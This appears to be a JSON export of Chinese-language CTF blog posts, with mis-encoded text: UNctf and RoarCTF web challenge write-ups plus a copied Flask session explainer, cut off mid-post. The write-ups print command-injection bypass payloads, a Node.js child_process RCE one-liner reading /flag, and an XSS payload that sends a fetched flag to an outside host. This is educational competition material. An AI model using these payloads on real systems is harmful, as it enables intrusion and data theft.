{"total":50,"pageSize":8,"pageCount":7,"data":[{"title":"UNctf èµ›åå›é¡¾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-èµ›åå›é¡¾\"><a href=\"#UNctf-èµ›åå›é¡¾\" class=\"headerlink\" title=\"UNctf èµ›åå›é¡¾\"></a>UNctf èµ›åå›é¡¾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>é¢˜ç›®æºç ï¼š</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>æ­£åˆ™é»‘åå•åŒ¹é…ï¼Œå¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶åŠ ä¸ŠåŒå¼•å·ï¼Œå³ä½¿æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ä¹Ÿä¼šè¢«åŠ ä¸ŠåŒå¼•å·æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œç”¨åˆ°äº†åå¼•å· ```</p>\n<p>è§‚å¯Ÿç¬¬ä¸€ä¸ªæ­£åˆ™ `\\|`` ä¸‰ä¸ªåæ–œæ æ‰èƒ½è½¬ä¹‰åæ–œæ ï¼Œè¿™é‡Œå¯¹ | è¿›è¡Œäº†è½¬ä¹‰ä»è€Œé€ æˆåå¼•å·é€ƒé€¸ã€‚</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>å¯ä»¥çœ‹åˆ°åå¼•å·æˆåŠŸé€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åˆ°é¢˜ç›®ä¸­å°è¯•åˆ—ç›®å½•ï¼Œæ²¡æœ‰ <code>ls</code> å¯ä»¥ç”¨ <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\nå“åº”ï¼š\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>æŸ¥æ‰¾flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\nå“åº”ï¼š\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>ç¬¬äºŒä¸ªæ­£åˆ™ <code>\\\\|\\n</code> ä¼šè§£é‡Šä¸ºç«–çº¿å’Œæ¢è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨ <code>%0a</code> è¿›è¡Œæ¢è¡Œç»•è¿‡ï¼ŒåŒæ—¶æœ«å°¾ä½¿ç”¨ <code>%20#</code> æ¥ç»ˆæ­¢å‘½ä»¤å¤„ç†åŒå¼•å·</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\næ•ˆæœæ˜¯\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>åœ¨ç•™è¨€æ¿å¤„æäº¤ xss å‘ç°èƒ½å¤Ÿè§¦å‘ï¼Œè®¿é—®å‚¨å­˜çš„è·¯å¾„å‘ç°ä¸€ä¸ªæ¥å£</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å¤´é‡Œå¸¦ä¸Šäº† <code>XMLHttpRequest</code> ï¼ŒåŒæ—¶ä¸å¸¦å‚æ•°è®¿é—®æ—¶å¾—åˆ° debug é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° XHRè¯·æ±‚å¸¦ä¸Šäº† cookie ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  XHR è¯·æ±‚</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>æŸ¥çœ‹æºç å‘ç°å„ä¸ªæ¥å£</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`ğŸ™${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>ä¿®æ”¹å®Œåå­—åæµ‹è¯• <code>/calc 1+1</code> å‘ç°æˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨ä»£ç æ³¨å…¥å‚è€ƒ<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>å°è¯• <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> å…¶ä¸­ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ $IFS ï¼ŒåŒæ—¶Syncé‡‡ç”¨éé˜»å¡è¿”å›ã€‚</p>\n","text":"UNctf èµ›åå›é¡¾bypassé¢˜ç›®æºç ï¼š&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"flask-session","slug":"flask-session","date":"2019-11-06T12:43:45.000Z","updated":"2019-11-06T13:12:13.785Z","comments":true,"path":"api/articles/flask-session.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"flask-session\"><a href=\"#flask-session\" class=\"headerlink\" title=\"flask-session\"></a>flask-session</h1><p>11/6/2019 8:43:45 PM </p>\n<p>æ¬è¿æ–‡ç«  <a href=\"https://cizixs.com/2017/03/08/flask-insight-session/\" target=\"_blank\" rel=\"noopener\">https://cizixs.com/2017/03/08/flask-insight-session/</a></p>\n<p><strong>sessionæ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼š</strong></p>\n<p>cookieå’Œsessionç»“åˆä½¿ç”¨ï¼šwebå¼€å‘å‘å±•è‡³ä»Šï¼Œcookieå’Œsessionçš„ä½¿ç”¨å·²ç»å‡ºç°äº†ä¸€äº›éå¸¸æˆç†Ÿçš„æ–¹æ¡ˆã€‚åœ¨å¦‚ä»Šçš„å¸‚åœºæˆ–è€…ä¼ä¸šé‡Œï¼Œä¸€èˆ¬æœ‰ä¸¤ç§å­˜å‚¨æ–¹å¼ï¼š</p>\n<ul>\n<li><p>å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼šé€šè¿‡cookieå­˜å‚¨ä¸€ä¸ª<code>session_id</code>ï¼Œç„¶åå…·ä½“çš„æ•°æ®åˆ™æ˜¯ä¿å­˜åœ¨sessionä¸­ã€‚å¦‚æœç”¨æˆ·å·²ç»ç™»å½•ï¼Œåˆ™æœåŠ¡å™¨ä¼šåœ¨cookieä¸­ä¿å­˜ä¸€ä¸ª<code>session_id</code>ï¼Œä¸‹æ¬¡å†æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šæŠŠè¯¥<code>session_id</code>æºå¸¦ä¸Šæ¥ï¼ŒæœåŠ¡å™¨æ ¹æ®session_idåœ¨sessionåº“ä¸­è·å–ç”¨æˆ·çš„sessionæ•°æ®ã€‚å°±èƒ½çŸ¥é“è¯¥ç”¨æˆ·åˆ°åº•æ˜¯è°ï¼Œä»¥åŠä¹‹å‰ä¿å­˜çš„ä¸€äº›çŠ¶æ€ä¿¡æ¯ã€‚è¿™ç§ä¸“ä¸šæœ¯è¯­å«åš<code>server side session</code>ã€‚</p>\n</li>\n<li><p>å°†sessionæ•°æ®åŠ å¯†ï¼Œç„¶åå­˜å‚¨åœ¨cookieä¸­ã€‚è¿™ç§ä¸“ä¸šæœ¯è¯­å«åš<code>client side session</code>ã€‚flaské‡‡ç”¨çš„å°±æ˜¯è¿™ç§æ–¹å¼ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ›¿æ¢æˆå…¶ä»–å½¢å¼ã€‚</p>\n</li>\n</ul>\n<p>åœ¨è§£æ session çš„å®ç°ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸‹ session æ€ä¹ˆä½¿ç”¨ã€‚session å¯ä»¥çœ‹åšæ˜¯åœ¨ä¸åŒçš„è¯·æ±‚ä¹‹é—´ä¿å­˜æ•°æ®çš„æ–¹æ³•ï¼Œå› ä¸º HTTP æ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œä½†æ˜¯åœ¨ä¸šåŠ¡åº”ç”¨ä¸Šæˆ‘ä»¬å¸Œæœ›çŸ¥é“ä¸åŒè¯·æ±‚æ˜¯å¦æ˜¯åŒä¸€ä¸ªäººå‘èµ·çš„ã€‚æ¯”å¦‚è´­ç‰©ç½‘ç«™åœ¨ç”¨æˆ·ç‚¹å‡»è¿›å…¥è´­ç‰©è½¦çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éœ€è¦çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·æ‰§è¡Œäº†è¿™ä¸ªæ“ä½œã€‚</p>\n<p>åœ¨ flask ä¸­ä½¿ç”¨ session ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦ä½¿ç”¨ from flask import session å¯¼å…¥è¿™ä¸ªå˜é‡ï¼Œåœ¨ä»£ç ä¸­å°±èƒ½ç›´æ¥é€šè¿‡è¯»å†™å®ƒå’Œ session äº¤äº’ã€‚</p>\n<pre><code>from flask import Flask, session, escape, request\n\napp = Flask(__name__)\napp.secret_key = &apos;please-generate-a-random-secret_key&apos;\n\n\n@app.route(&quot;/&quot;)\ndef index():\n    if &apos;username&apos; in session:\n        return &apos;hello, {}\\n&apos;.format(escape(session[&apos;username&apos;]))\n    return &apos;hello, stranger\\n&apos;\n\n\n@app.route(&quot;/login&quot;, methods=[&apos;POST&apos;])\ndef login():\n    session[&apos;username&apos;] = request.form[&apos;username&apos;]\n    return &apos;login success&apos;\n\n\nif __name__ == &apos;__main__&apos;:\n    app.run(host=&apos;0.0.0.0&apos;, port=5000, debug=True)</code></pre><p>ä¸Šé¢è¿™æ®µä»£ç æ¨¡æ‹Ÿäº†ä¸€ä¸ªéå¸¸ç®€å•çš„ç™»é™†é€»è¾‘ï¼Œç”¨æˆ·è®¿é—® <code>POST /login</code> æ¥ç™»é™†ï¼Œåé¢è®¿é—®é¡µé¢çš„æ—¶å€™ <code>GET /</code>ï¼Œä¼šè¿”å›è¯¥ç”¨æˆ·çš„åå­—</p>\n<p>ç›´æ¥è®¿é—®ï¼š</p>\n<pre><code>GET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nHost: 127.0.0.1:5000\nUser-Agent: HTTPie/0.8.0\n\n\nHTTP/1.0 200 OK\nContent-Length: 14\nContent-Type: text/html; charset=utf-8\nDate: Wed, 01 Mar 2017 04:22:18 GMT\nServer: Werkzeug/0.11.2 Python/2.7.10\n\nhello stranger</code></pre><p>ç”¨æˆ·åcizixs æ¨¡æ‹Ÿç™»å½•ï¼š</p>\n<pre><code>POST /login HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 15\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nHost: 127.0.0.1:5000\nUser-Agent: HTTPie/0.8.0\n\nusername=cizixs\n\nHTTP/1.0 200 OK\nContent-Length: 13\nContent-Type: text/html; charset=utf-8\nDate: Wed, 01 Mar 2017 04:20:54 GMT\nServer: Werkzeug/0.11.2 Python/2.7.10\nSet-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4; HttpOnly; Path=/\n\nlogin success</code></pre><p>æœ€é‡è¦çš„æ˜¯æˆ‘ä»¬çœ‹åˆ° response ä¸­æœ‰ <code>Set-Cookie</code> çš„å¤´éƒ¨ï¼Œcookie çš„é”®æ˜¯ <code>session</code></p>\n<p>è¿™æ¬¡è¯·æ±‚æˆ‘ä»¬å¸¦ä¸Šä¸Šæ¬¡çš„ cookie è®¿é—®ï¼š</p>\n<pre><code>GET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nCookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fevg.LE03yEZDWTUMQW-nNkTr1zBEhKk\nHost: 127.0.0.1:5000\nUser-Agent: HTTPie/0.8.0\n\n\nHTTP/1.0 200 OK\nContent-Length: 11\nContent-Type: text/html; charset=utf-8\nDate: Wed, 01 Mar 2017 04:25:46 GMT\nServer: Werkzeug/0.11.2 Python/2.7.10\nSet-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5feyg.sfFCDIqfef4i8cvxUClUUGQNcHA; HttpOnly; Path=/\n\nhellocizixs</code></pre><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸçš„ä¸é€šè¿‡ç”¨æˆ·åç™»é™†ã€‚</p>\n<p>æ€»ç»“ä¸€ä¸‹ï¼šsession æ˜¯é€šè¿‡åœ¨å®¢æˆ·ç«¯è®¾ç½® cookie å®ç°çš„ï¼Œæ¯æ¬¡å®¢æˆ·ç«¯å‘é€è¯·æ±‚çš„æ—¶å€™ä¼šé™„å¸¦ç€æ‰€æœ‰çš„ cookieï¼Œè€Œé‡Œé¢ä¿å­˜ç€ä¸€äº›é‡è¦çš„ä¿¡æ¯ï¼ˆæ¯”å¦‚è¿™é‡Œçš„ç”¨æˆ·ä¿¡æ¯ï¼‰ï¼Œè¿™æ ·æœåŠ¡å™¨ç«¯å°±èƒ½çŸ¥é“å®¢æˆ·ç«¯çš„ä¿¡æ¯ï¼Œç„¶åæ ¹æ®è¿™äº›æ•°æ®åšå‡ºå¯¹åº”çš„åˆ¤æ–­ï¼Œå°±å¥½åƒä¸åŒè¯·æ±‚ä¹‹é—´æ˜¯æœ‰è®°å¿†çš„ã€‚</p>\n<p><strong>è¯·æ±‚è¿‡ç¨‹</strong></p>\n<ul>\n<li>è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œflask ä¼šæ ¹æ® cookie ä¿¡æ¯åˆ›å»ºå‡º session å˜é‡ï¼ˆå¦‚æœ cookie ä¸å­˜åœ¨ï¼Œè¿™ä¸ªå˜é‡æœ‰å¯èƒ½ä¸ºç©ºï¼‰ï¼Œä¿å­˜åœ¨è¯¥è¯·æ±‚çš„ä¸Šä¸‹æ–‡ä¸­</li>\n<li>è§†å›¾å‡½æ•°å¯ä»¥è·å– session ä¸­çš„ä¿¡æ¯ï¼Œå®ç°è‡ªå·±çš„é€»è¾‘å¤„ç†</li>\n<li>flask ä¼šåœ¨å‘é€ response çš„æ—¶å€™ï¼Œæ ¹æ® session çš„å€¼ï¼ŒæŠŠå®ƒå†™å›åˆ° cookie ä¸­</li>\n</ul>\n<p>æ³¨æ„ï¼šsession å’Œ cookie çš„è½¬åŒ–è¿‡ç¨‹ä¸­ï¼Œåº”è¯¥è€ƒè™‘åˆ°å®‰å…¨æ€§ï¼Œä¸ç„¶ç›´æ¥ä½¿ç”¨ä¼ªé€ çš„ cookie ä¼šæ˜¯ä¸ªå¾ˆå¤§çš„å®‰å…¨éšæ‚£ã€‚</p>\n<p><strong>åŠ å¯†session</strong></p>\n<p>æ¬è¿<a href=\"https://www.leavesongs.com/PENETRATION/client-session-security.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>\n<p>flask å¤„ç† session å®‰å…¨æ€§é—®é¢˜æ—¶åœ¨ä»£ç ä¸­æ–°å»ºäº† <code>URLSafeTimedSerializer</code> ç±» ï¼Œç”¨å®ƒçš„dumpsæ–¹æ³•å°†ç±»å‹ä¸ºå­—å…¸çš„ <code>session</code> å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åç”¨ <code>response.set_cookie</code> å°†æœ€åçš„å†…å®¹ä¿å­˜åœ¨cookieä¸­ã€‚ </p>\n<p><code>URLSafeTimedSerializer</code> åšäº†ä»€ä¹ˆï¼Ÿä¸»è¦ç»è¿‡å‡ æ­¥</p>\n<ul>\n<li>json.dumps å°†å¯¹è±¡è½¬æ¢æˆjsonå­—ç¬¦ä¸²ï¼Œä½œä¸ºæ•°æ®</li>\n<li>å¦‚æœæ•°æ®å‹ç¼©åé•¿åº¦æ›´çŸ­ï¼Œåˆ™ç”¨zlibåº“è¿›è¡Œå‹ç¼©</li>\n<li>å°†æ•°æ®ç”¨base64ç¼–ç </li>\n<li>é€šè¿‡hmacç®—æ³•è®¡ç®—æ•°æ®çš„ç­¾åï¼Œå°†ç­¾åé™„åœ¨æ•°æ®åï¼Œç”¨â€œ.â€åˆ†å‰²</li>\n</ul>\n<p>ç¬¬4æ­¥å°±è§£å†³äº†ç”¨æˆ·ç¯¡æ”¹sessionçš„é—®é¢˜ï¼Œå› ä¸ºåœ¨ä¸çŸ¥é“ <code>secret_key</code> çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ— æ³•ä¼ªé€ ç­¾åçš„ã€‚æ³¨æ„åˆ°ï¼Œåœ¨ç¬¬4æ­¥ä¸­ï¼Œflaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶ session çš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚</p>\n<p><strong>è§£å¯†session</strong></p>\n<p>æœ‰æ—¶å€™åœ¨å¼€å‘æˆ–è€…è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦äº†è§£ cookie ä¸­ä¿å­˜çš„åˆ°åº•æ˜¯ä»€ä¹ˆå€¼ï¼Œå¯ä»¥é€šè¿‡æ‰‹åŠ¨è§£æå®ƒçš„å€¼ã€‚session åœ¨ cookie ä¸­çš„å€¼ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”±å¥å·åˆ†å‰²æˆä¸‰ä¸ªéƒ¨åˆ†ã€‚ç¬¬ä¸€éƒ¨åˆ†æ˜¯ base64 åŠ å¯†çš„æ•°æ®ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯æ—¶é—´æˆ³ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯æ ¡éªŒä¿¡æ¯ã€‚</p>\n<p>å‰é¢ä¸¤éƒ¨åˆ†çš„å†…å®¹å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–ï¼Œä»£ç ä¹Ÿå¯ç›´è§‚ï¼Œå°±ä¸ç»™å‡ºè§£é‡Šäº†ï¼š</p>\n<pre><code>In [1]: from itsdangerous import *\n\nIn [2]: s = &apos;eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4&apos;\n\nIn [3]: data, timstamp, secret = s.split(&apos;.&apos;)\n\nIn [4]: base64_decode(data)\nOut[4]: &apos;{&quot;username&quot;:&quot;cizixs&quot;}&apos;\n\nIn [5]: bytes_to_int(base64_decode(timstamp))\nOut[5]: 194502054\n\nIn [7]: time.strftime(&apos;%Y-%m-%d %H:%I%S&apos;, time.localtime(194502054+EPOCH))\nOut[7]: &apos;2017-03-01 12:1254&apos;</code></pre><p><strong>sessionä½¿ç”¨</strong></p>\n<p>ä¸Šé¢çœ‹åˆ° session å…¶å®å°±åƒä¸€ä¸ªå­—å…¸ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š</p>\n<pre><code>session[&apos;name&apos;] = name</code></pre>","text":"flask-session11/6/2019 8:43:45 PM æ¬è¿æ–‡ç«  https://cizixs.com/2017/03/08/flask-insight-session/sessionæ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼šcookieå’Œsessionç»“åˆä½¿ç”¨ï¼šwebå¼€å‘å‘å±•è‡³ä»Šï¼Œcookie","link":"","raw":null,"photos":[],"categories":[{"name":"web","slug":"web","count":1,"path":"api/categories/web.json"}],"tags":[{"name":"flask","slug":"flask","count":1,"path":"api/tags/flask.json"}]},{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• <code>/Download?filename=help.docx</code> ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ <code>SSTI</code> ?fuzzäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°æ€è·¯.  ğŸ¨</p>\n<p>æ”¹å˜è¯·æ±‚æ–¹å¼ä¸º <code>post</code> å³å¯æˆåŠŸä¸‹è½½åˆ° <code>help.docx</code> ,é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ </p>\n<p>éšä¾¿ä¸‹è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¾—åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæœ‰æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚åšçš„æ—¶å€™å°±è¢«éš¾åˆ°çš„åœ°æ–¹å°±æ˜¯æ–‡ä»¶ä¸‹è½½ä¸çŸ¥é“ä¸‹è½½ä»€ä¹ˆä¸œè¥¿ã€‚è®°å¾—ä¸Šæ¬¡ç¢°åˆ°è¿™ç§é¢˜çš„æ—¶å€™è¿˜æ˜¯ <code>SUCTF</code> è¯» <code>nginx</code> é…ç½®æ–‡ä»¶</p>\n<h3 id=\"ä»€ä¹ˆæ˜¯-WEB-INF\"><a href=\"#ä»€ä¹ˆæ˜¯-WEB-INF\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯ WEB-INF\"></a>ä»€ä¹ˆæ˜¯ WEB-INF</h3><blockquote>\n<p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰ã€‚</p>\n</li>\n</ol>\n<p>å…¶ä»–çš„é…ç½®æ–‡ä»¶ä»‹ç»çœ‹<a href=\"https://baike.baidu.com/item/web-inf\" title=\"è¿™é‡Œ\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>äº‹å®ä¸Šå°±æ˜¯åœ¨xmlä¸­é…ç½®å¥½æ˜ å°„è·¯å¾„ç„¶åè¿›è¡Œå¯¹æŸäº›å«å—ä¿æŠ¤å†…å®¹æ–‡ä»¶çš„è®¿é—®ã€‚</p>\n<p>æˆ‘ä»¬è®¿é—® <code>WEB-INF/web.xml</code> å‘ç°æ“ä½œflagçš„å…³é”®é…ç½®</p>\n<p>æŒ‰ç…§æ˜ å°„å…³ç³»è®¿é—® <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯å¾—åˆ°è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å³å¯</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>å³é”®æŸ¥çœ‹æºç </p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; 